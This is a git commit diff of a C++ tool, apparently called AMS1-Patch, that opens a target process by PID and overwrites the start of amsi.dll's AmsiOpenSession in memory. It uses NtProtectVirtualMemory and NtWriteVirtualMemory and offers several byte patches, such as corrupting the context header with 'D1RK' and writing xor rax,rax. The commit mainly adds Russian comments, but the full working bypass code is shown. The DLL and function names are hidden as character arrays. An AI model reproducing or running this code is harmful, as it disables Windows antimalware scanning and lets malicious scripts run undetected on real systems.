c8e0c3757986f2298bfed7e1be862d0d8a6366a2
podyn <podyn@ANDREY>
2022-11-02 12:34:48 +0300

    two hack

--- OpenSession/Ams1.cpp
+++ OpenSession/Ams1.cpp
@@ -10,12 +10,16 @@
 char ams1[] = { 'a','m','s','i','.','d','l','l',0 };
 char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };
 
+// Структура Nt функции для снятия защиты с памяти
+
 EXTERN_C NTSTATUS NtProtectVirtualMemory(
 	IN HANDLE ProcessHandle,
 	IN OUT PVOID* BaseAddress,
 	IN OUT PSIZE_T RegionSize,
 	IN ULONG NewProtect,
 	OUT PULONG OldProtect);
+
+// Структура Nt функции для записи в память
 
 EXTERN_C NTSTATUS NtWriteVirtualMemory(
 	IN HANDLE ProcessHandle,
@@ -27,42 +31,43 @@ EXTERN_C NTSTATUS NtWriteVirtualMemory(
 
 
 void AMS1patch1(HANDLE hproc) {
-
+	// Загружаем библиотеку и получачем адресс функции
 	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
 	INT_PTR ptr_0Val = *(INT_PTR*)((INT_PTR)ptr);
 
-	// Before Patching:
-	// 8139414d5349		:	cmp     dword ptr [rcx],49534D41h  => AMSI,AMSI
-	// 753a				:	jne     amsi!AmsiOpenSession+0x4c  => Not Triggered
-	// 
 
+	// Инициализируем буффер очищаем его и присваивает туда H1A
 	char Patch[100];
 	ZeroMemory(Patch, 100);
 	lstrcatA(Patch, "\x81\x39\x44\x31\x52\x4B\x75\x3a");
 
+	// Вывод буффера патч
 	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
 
 	DWORD OldProtect = 0;
 	SIZE_T memPage = 0x1000;
 	void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));
 
-
+	// Снимаем протекцию с памяти по адресу функции
 	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
 	if (!NT_SUCCESS(NtProtectStatus1)) {
 		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
 		return ;
 	}
+	// Записываем по адресу функции буффер
 	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + 0xa), (PVOID)Patch, 8, (SIZE_T*)nullptr);
 	if (!NT_SUCCESS(NtWriteStatus)) {
 		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
 		return ;
 	}
+	// Меняем протецию памяти на изначальное значение
 	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
 	if (!NT_SUCCESS(NtProtectStatus2)) {
 		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
 		return ;
 	}
 
+	// Вывод то что сделала программма в памяти
 	printf("\nAfter Patching :\n ");
 	printf("\t81394431524B\t\t		:	cmp     dword ptr [rcx],4B523144h  => AMSI,D1RK\n");
 	printf("\t753a\t				:	jne     amsi!AmsiOpenSession+0x4c  => Triggered\n\n");
@@ -71,41 +76,44 @@ void AMS1patch1(HANDLE hproc) {
 }
 
 void AMS1patch2(HANDLE hproc) {
+	// Загружаем библиотеку и получачем адресс функции
 	
 	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
 	INT_PTR ptr_0Val = *(INT_PTR*)((INT_PTR)ptr);
 
 
 
-	// 0:  c7 01 44 31 52 4b       mov    DWORD PTR [rcx],0x4b523144 (D1RK)
-	// 6:  90                      nop
-	// 7 : 90                      nop
+	// Инициализируем буффер очищаем его и присваивает туда H1A
 	char Patch[100];
 	ZeroMemory(Patch, 100);
 	lstrcatA(Patch, "\xC7\x01\x44\x31\x52\x4B\x90\x90");
 
+	// Вывод буффера патч
 	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
 
 	DWORD OldProtect = 0;
 	SIZE_T memPage = 0x1000;
 	void* ptraddr = ptr;
 
-
+	// Снимаем протекцию с памяти по адресу функции
 	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
 	if (!NT_SUCCESS(NtProtectStatus1)) {
 		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
 		return;
 	}
+	// Записываем по адресу функции буффер
 	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr), (PVOID)Patch, 8, (SIZE_T*)nullptr);
 	if (!NT_SUCCESS(NtWriteStatus)) {
 		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
 		return;
 	}
+	// Меняем протецию памяти на изначальное значение
 	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
 	if (!NT_SUCCESS(NtProtectStatus2)) {
 		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
 		return;
 	}
+	// Вывод то что сделала программма в памяти
 	printf("\n[+] After Patching :\n");
 	printf("\tc7014431524b       mov    DWORD PTR [rcx],0x4b523144 (D1RK)\n");
 	printf("\n[+] AMSI context header has been corrupted with \"D1RK\", AMS1 session Not Created !!\n");
@@ -115,40 +123,42 @@ void AMS1patch2(HANDLE hproc) {
 
 void AMS1patchxor(HANDLE hproc, int number) {
 
+	// Загружаем библиотеку и получачем адресс функции
 	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
 
-	// Before Patching:
-	// 8139414d5349		:	cmp     dword ptr [rcx],49534D41h  => AMSI,AMSI
-	// 753a				:	jne     amsi!AmsiOpenSession+0x4c  => Not Triggered
-	// 
+
+	// Инициализируем буффер очищаем его и присваивает туда H1A
 
 	char Patch[100];
 	ZeroMemory(Patch, 100);
 	lstrcatA(Patch, "\x48\x31\xC0");
 
+	// Вывод буффера патч
 	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
 
 	DWORD OldProtect = 0;
 	SIZE_T memPage = 0x1000;
 	void* ptraddr = (void*)(((INT_PTR)ptr + number));
 
-
+	// Снимаем протекцию с памяти по адресу функции
 	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
 	if (!NT_SUCCESS(NtProtectStatus1)) {
 		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
 		return;
 	}
+	// Записываем по адресу функции буффер
 	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + number), (PVOID)Patch, 3, (SIZE_T*)nullptr);
 	if (!NT_SUCCESS(NtWriteStatus)) {
 		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
 		return;
 	}
+	// Меняем протецию памяти на изначальное значение
 	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
 	if (!NT_SUCCESS(NtProtectStatus2)) {
 		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
 		return;
 	}
-
+	// Вывод то что сделала программма в памяти
 	printf("\nAfter Patching :\n ");
 	printf("\t4831c0\t\t\t\t              :   xor    rax,rax  => ZF = 1\n");
 	printf("\t753a\t				:	jne     amsi!AmsiOpenSession+0x4c  => Triggered\n\n");
@@ -159,40 +169,42 @@ void AMS1patchxor(HANDLE hproc, int number) {
 
 void AMS1xornop(HANDLE hproc, int number) {
 
+	// Загружаем библиотеку и получачем адресс функции
 	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
 
-	// Before Patching:
-	// 4883790800      cmp     qword ptr [rcx+10h],0
-	// 7433            je      amsi!AmsiOpenSession+0x4c
-	// 
 
+	// Инициализируем буффер очищаем его и присваивает туда H1A
 	char Patch[100];
 	ZeroMemory(Patch, 100);
 	lstrcatA(Patch, "\x48\x31\xC0\x90\x90");
 
+	// Вывод буффера патч
 	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
 
 	DWORD OldProtect = 0;
 	SIZE_T memPage = 0x1000;
 	void* ptraddr = (void*)(((INT_PTR)ptr + number));
 
-
+	// Снимаем протекцию с памяти по адресу функции
 	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
 	if (!NT_SUCCESS(NtProtectStatus1)) {
 		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
 		return;
 	}
+	// Записываем по адресу функции буффер
 	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + number), (PVOID)Patch, 5, (SIZE_T*)nullptr);
 	if (!NT_SUCCESS(NtWriteStatus)) {
 		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
 		return;
 	}
+	// Меняем протецию памяти на изначальное значение
 	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
 	if (!NT_SUCCESS(NtProtectStatus2)) {
 		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
 		return;
 	}
 
+	// Вывод результата работы программы
 	printf("\nAfter Patching :\n ");
 	printf("\t4831c0\t\t\t\t              :   xor    rax,rax  => ZF = 1\n");
 	printf("\t753a\t				:	jne     amsi!AmsiOpenSession+0x4c  => Triggered\n\n");
@@ -205,11 +217,13 @@ int main(int argc, char** argv) {
 
 	HANDLE hProc;
 
+	// Проверяем если передаваемых параметров меньше 2, то выводим ошибку
 	if (argc < 3) {
 		printf("USAGE: AMS1-Patch.exe <PID> <Patch_Nbr, 1 to 6>\n");
 		return 1;
 	}
-	
+
+	// Получаем хендл процесса с правами на чтение и запись, если хендл не получили то выводим ошику
 	hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
 	if (!hProc) {
 		printf("Failed in OpenProcess (%u)\n", GetLastError());
